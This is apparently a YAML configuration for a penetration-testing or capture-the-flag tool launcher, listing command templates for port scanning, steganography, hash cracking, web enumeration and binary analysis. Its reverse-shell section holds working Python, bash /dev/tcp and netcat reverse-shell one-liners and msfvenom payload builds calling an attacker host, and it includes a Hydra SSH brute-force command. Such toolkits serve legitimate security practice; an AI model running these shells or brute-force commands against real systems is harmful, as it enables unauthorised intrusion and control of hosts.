categories:
  network_recon:
    name: "üîç Network Reconnaissance"
    tools:
      rustscan:
        name: "RustScan - Ultra Fast Port Scanner"
        description: "Modern port scanner that feeds results to Nmap. Scans all 65k ports in seconds."
        command: "rustscan -a {target_ip} -- -A -sC"
        params:
          - target_ip

      nmap_fast:
        name: "Nmap - Fast Scan (Top 1000)"
        description: "Quick scan of most common 1000 ports with service detection"
        command: "nmap -T4 -F -sV {target_ip}"
        params:
          - target_ip

      nmap_vuln:
        name: "Nmap - Vulnerability Scan"
        description: "Deep vulnerability detection using NSE scripts"
        command: "nmap -T4 -sV --script vuln {target_ip}"
        params:
          - target_ip

      masscan:
        name: "Masscan - Mass IP Scanner"
        description: "Fastest port scanner for entire networks (requires sudo)"
        command: "sudo masscan -p1-65535 {target_ip} --rate=1000"
        params:
          - target_ip

  steganography:
    name: "üñºÔ∏è Steganography & Forensics"
    tools:
      exiftool:
        name: "ExifTool - Metadata Extractor"
        description: "Extract all EXIF metadata from images/files for hidden clues"
        command: "exiftool {file_path}"
        params:
          - file_path

      binwalk:
        name: "Binwalk - Firmware/File Carver"
        description: "Scan for embedded files and extract hidden data from images"
        command: "binwalk -e {file_path}"
        params:
          - file_path

      steghide_extract:
        name: "Steghide - Extract Hidden Data"
        description: "Extract secret data hidden in JPEG/BMP/WAV files"
        command: "steghide extract -sf {file_path}"
        params:
          - file_path

      zsteg:
        name: "Zsteg - PNG/BMP LSB Analysis"
        description: "Detect LSB steganography in PNG and BMP images"
        command: "zsteg -a {file_path}"
        params:
          - file_path

      strings_deep:
        name: "Strings - Deep Text Extraction"
        description: "Extract all readable strings from binary files (min 6 chars)"
        command: "strings -n 6 {file_path}"
        params:
          - file_path

      foremost:
        name: "Foremost - File Carver"
        description: "Recover files based on headers/footers (supports many formats)"
        command: "foremost -i {file_path} -o {output_dir}"
        params:
          - file_path
          - output_dir

  password_cracking:
    name: "üîì Password Cracking"
    tools:
      john_basic:
        name: "John the Ripper - Auto Mode"
        description: "Crack password hashes using wordlist and rules"
        command: "john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}"
        params:
          - hash_file

      john_show:
        name: "John - Show Cracked Passwords"
        description: "Display already cracked passwords from john.pot"
        command: "john --show {hash_file}"
        params:
          - hash_file

      hashcat_md5:
        name: "Hashcat - MD5 Cracking"
        description: "GPU-accelerated MD5 hash cracking with wordlist"
        command: "hashcat -m 0 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
        params:
          - hash_file

      hashcat_ntlm:
        name: "Hashcat - NTLM Cracking"
        description: "Crack Windows NTLM hashes (mode 1000)"
        command: "hashcat -m 1000 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
        params:
          - hash_file

      hashcat_sha256:
        name: "Hashcat - SHA256 Cracking"
        description: "Crack SHA256 hashes with combinator attack"
        command: "hashcat -m 1400 -a 0 {hash_file} /usr/share/wordlists/rockyou.txt"
        params:
          - hash_file

      hydra_ssh:
        name: "Hydra - SSH Brute Force"
        description: "Brute force SSH login with username and wordlist"
        command: "hydra -l {username} -P /usr/share/wordlists/rockyou.txt ssh://{target_ip}"
        params:
          - username
          - target_ip

  crypto_analysis:
    name: "üîê Cryptography Tools"
    tools:
      hash_identifier:
        name: "Hash-Identifier - Detect Hash Type"
        description: "Identify hash type (MD5, SHA1, NTLM, etc.)"
        command: "hash-identifier"
        params: []

      base64_decode:
        name: "Base64 - Decode String"
        description: "Decode base64 encoded string"
        command: "echo {encoded_string} | base64 -d"
        params:
          - encoded_string

      openssl_aes_decrypt:
        name: "OpenSSL - AES256 Decrypt"
        description: "Decrypt AES256 encrypted file"
        command: "openssl enc -aes-256-cbc -d -in {encrypted_file} -out {output_file}"
        params:
          - encrypted_file
          - output_file

      cyberchef_local:
        name: "CyberChef (Local HTML)"
        description: "Opens local CyberChef in Firefox (Requires install_arsenal.sh run)"
        command: "bash -c 'if [ -f /opt/tajaa-tools/cyberchef/CyberChef.html ]; then firefox /opt/tajaa-tools/cyberchef/CyberChef.html; else echo \"[!] CyberChef not found. Please run install_arsenal.sh\"; fi'"
        params: []

  reverse_shells:
    name: "üêö Reverse Shells & Payloads"
    tools:
      python_shell:
        name: "Python - Reverse Shell"
        description: "Spawn Python reverse shell to attacker machine"
        command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        params:
          - lhost
          - lport

      bash_shell:
        name: "Bash - Reverse Shell"
        description: "Bash TCP reverse shell one-liner"
        command: "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        params:
          - lhost
          - lport

      nc_reverse:
        name: "Netcat - Reverse Shell"
        description: "Netcat reverse shell (traditional)"
        command: "nc {lhost} {lport} -e /bin/bash"
        params:
          - lhost
          - lport

      msfvenom_linux:
        name: "Msfvenom - Linux ELF Payload"
        description: "Generate stageless Linux reverse shell binary"
        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output_file}"
        params:
          - lhost
          - lport
          - output_file

      msfvenom_windows:
        name: "Msfvenom - Windows EXE Payload"
        description: "Generate Windows reverse shell executable"
        command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
        params:
          - lhost
          - lport
          - output_file

  web_quick:
    name: "üåê Quick Web Enumeration"
    tools:
      gobuster_dir:
        name: "Gobuster - Directory Brute Force"
        description: "Fast directory and file enumeration"
        command: "gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt -t 50"
        params:
          - target_ip

      ffuf_vhost:
        name: "Ffuf - Virtual Host Discovery"
        description: "Discover virtual hosts on web server"
        command: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target_ip} -H 'Host: FUZZ.{domain}'"
        params:
          - target_ip
          - domain

      whatweb:
        name: "WhatWeb - Technology Fingerprint"
        description: "Identify web technologies, CMS, frameworks"
        command: "whatweb -a 3 http://{target_ip}"
        params:
          - target_ip

      curl_headers:
        name: "Curl - HTTP Headers Analysis"
        description: "Retrieve and analyze HTTP response headers"
        command: "curl -I http://{target_ip}"
        params:
          - target_ip

  binary_analysis:
    name: "‚öôÔ∏è Binary & Reverse Engineering"
    tools:
      file_identify:
        name: "File - Type Identification"
        description: "Identify file type and architecture"
        command: "file {file_path}"
        params:
          - file_path

      ltrace:
        name: "Ltrace - Library Call Tracer"
        description: "Trace dynamic library calls made by binary"
        command: "ltrace {binary_path}"
        params:
          - binary_path

      strace:
        name: "Strace - System Call Tracer"
        description: "Trace system calls and signals"
        command: "strace {binary_path}"
        params:
          - binary_path

      radare2_analyze:
        name: "Radare2 - Binary Analysis"
        description: "Open binary in radare2 with auto-analysis"
        command: "r2 -A {binary_path}"
        params:
          - binary_path

      objdump_disasm:
        name: "Objdump - Disassemble Binary"
        description: "Disassemble executable sections"
        command: "objdump -d {binary_path}"
        params:
          - binary_path

